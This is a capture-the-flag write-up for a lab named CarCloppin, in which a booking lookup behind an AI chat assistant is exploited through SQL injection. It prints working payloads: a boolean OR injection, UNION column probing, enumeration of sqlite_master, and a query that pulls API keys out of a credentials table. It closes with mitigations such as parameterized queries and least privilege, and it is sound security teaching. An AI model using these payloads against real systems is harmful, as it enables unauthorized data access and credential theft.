---
title: "SQL Injection Exposes API Credentials | CarCloppin"
date: 2026-07-12 18:20:00 +0530
categories: [A05 - Injection, SQL Injection]
tags: [sql-injection, ai-assistant, sqlite, union-based-sqli, information-disclosure, webverse-pro]
author: Shivansh Sharma
platform: WebVerse Pro
image:
  path: /assets/images/posts/carcloppin-sql-injection.webp
  alt: CarCloppin SQL Injection challenge cover
---

## Lab Link

[CarCloppin — WebVerse Pro Mystery Challenge](https://dashboard.webverselabs-pro.com/mystery-challenges/carcloppin)

## Overview

CarCloppin was a dealership booking application that included an AI-powered assistant named **Riley**. The assistant allowed users to look up vehicle appointments by entering a booking reference.

Although the feature appeared to be an AI chat interface, the backend passed booking references into an unsafe SQLite query. By injecting SQL through the chat endpoint, it was possible to retrieve arbitrary database records, enumerate the database schema, and extract a sensitive API credential containing the challenge flag.

## Objective

The objective was to identify the vulnerability in the booking-reference lookup and retrieve the hidden flag from the application database.

## Vulnerability Identification

The application exposed an AI chat widget that sent the conversation history to:

```http
POST /api/chat
Content-Type: application/json
```

The frontend expected the server to return a `results` array containing appointment records.

Testing the booking lookup with a normal reference returned a single appointment. Adding a single quote to the reference altered the server response, suggesting that the value was being inserted directly into an SQL statement.

A boolean SQL injection payload confirmed the issue:

```text
VW-87DW77' OR '1'='1
```

Instead of returning one appointment, the assistant returned multiple booking records. This showed that the backend query could be manipulated through the booking-reference value.

## Recon and Approach

The initial investigation focused on understanding how the assistant communicated with the backend.

The application's JavaScript revealed that:

- Chat messages were sent to `/api/chat`.
- The complete chat history was included in the JSON request.
- Database lookup results were returned in a `results` array.
- Appointment records were rendered directly by the frontend.

The booking workflow was also inspected to determine the expected reference format. References followed a pattern similar to:

```text
VW-87DW77
```

Once the format was known, SQL-shaped input was supplied through the assistant.

## Exploitation

### Step 1: Confirm SQL Injection

A valid-looking booking reference was followed by a boolean condition:

```text
VW-87DW77' OR '1'='1
```

The injected condition evaluated to true for every row, causing the lookup to return multiple appointments.

The vulnerable query was likely similar to:

```sql
SELECT column1, column2, column3
FROM appointments
WHERE reference = '<USER_INPUT>';
```

After injection, the effective query became conceptually similar to:

```sql
SELECT column1, column2, column3
FROM appointments
WHERE reference = 'VW-87DW77' OR '1'='1';
```

### Step 2: Determine the UNION Column Count

`UNION SELECT` payloads were tested to identify how many columns the original query returned.

A successful payload required matching the number of selected columns and using compatible data types. `NULL` values were useful during this stage because SQLite can generally coerce them into different column types.

Example structure:

```text
VW-87DW77' UNION SELECT NULL,NULL,NULL-- -
```

The exact number of columns was adjusted until the server accepted the query and returned controlled output.

### Step 3: Enumerate the SQLite Schema

SQLite stores schema information in the `sqlite_master` table.

A UNION query was used to extract table names and SQL definitions:

```sql
SELECT name, sql
FROM sqlite_master
WHERE type='table';
```

A payload following this structure exposed the available database tables:

```text
VW-87DW77' UNION SELECT name,sql,NULL
FROM sqlite_master
WHERE type='table'-- -
```

Schema enumeration revealed an interesting table:

```text
api_credentials
```

The table contained a column named:

```text
api_key
```

This matched the challenge hint about the AI helper being connected using contractor-provided credentials.

### Step 4: Extract the Sensitive Credential

The final UNION query selected data from the `api_credentials` table:

```sql
SELECT api_key
FROM api_credentials;
```

Example payload structure:

```text
VW-87DW77' UNION SELECT api_key,NULL,NULL
FROM api_credentials-- -
```

The API key was returned through the assistant's normal appointment-results response.

## Proof and Flag

The SQL injection successfully exposed the contents of the `api_credentials` table.

```text
WEBVERSE{REDACTED}
```

The flag was stored inside the `api_key` field and was disclosed through the vulnerable `/api/chat` booking-reference lookup.

## Root Cause

The root cause was the direct construction of an SQL query using untrusted user input.

The booking reference supplied through the AI assistant was inserted into a SQLite query without parameterization. Because the assistant acted only as a conversational frontend, it did not provide any meaningful security boundary between the user and the database query.

The vulnerability was therefore not caused by the language model itself. It was caused by insecure backend code connected to the AI interface.

## Impact

An attacker could use this vulnerability to:

- Bypass booking-reference restrictions.
- Retrieve other customers' appointment records.
- Enumerate the complete SQLite schema.
- Access hidden application tables.
- Extract API credentials and other secrets.
- Potentially modify or delete database records if stacked or writable queries were supported.

In this challenge, the vulnerability resulted in disclosure of a sensitive API key containing the flag.

## Mitigation

### Use Parameterized Queries

The application should never concatenate user-controlled values into SQL statements.

Unsafe example:

```python
query = f"SELECT * FROM appointments WHERE reference = '{reference}'"
```

Safer example:

```python
cursor.execute(
    "SELECT * FROM appointments WHERE reference = ?",
    (reference,)
)
```

### Validate Booking References

Booking references should be checked against a strict allowlist pattern before reaching the database.

Example:

```regex
^[A-Z]{2}-[A-Z0-9]{6}$
```

Validation should be treated as defense in depth, not as a replacement for parameterized queries.

### Limit Database Privileges

The database account or connection used by the appointment lookup should have access only to the data required for that feature. Sensitive credential tables should not be accessible through the same database context.

### Separate Secrets from Application Data

API keys and other secrets should be stored in a dedicated secret-management system or protected environment configuration rather than in a general-purpose application database.

### Constrain AI Tool Access

AI assistants connected to backend tools should use narrowly scoped functions with structured parameters. The assistant should not be allowed to pass unrestricted strings into raw database queries.

### Avoid Returning Raw Database Results

The backend should map database rows into a fixed response model and return only the fields required by the frontend. Raw query output should never be exposed directly.

## Lessons Learned

- An AI interface does not eliminate traditional web vulnerabilities.
- Chat-based inputs must be treated as untrusted user input.
- Boolean SQL injection is often the fastest way to confirm an injectable lookup.
- SQLite schema enumeration through `sqlite_master` can quickly reveal hidden tables.
- Sensitive credentials should not share the same database access path as public booking data.
- AI tool integrations should use strict schemas, least privilege, and parameterized backend operations.
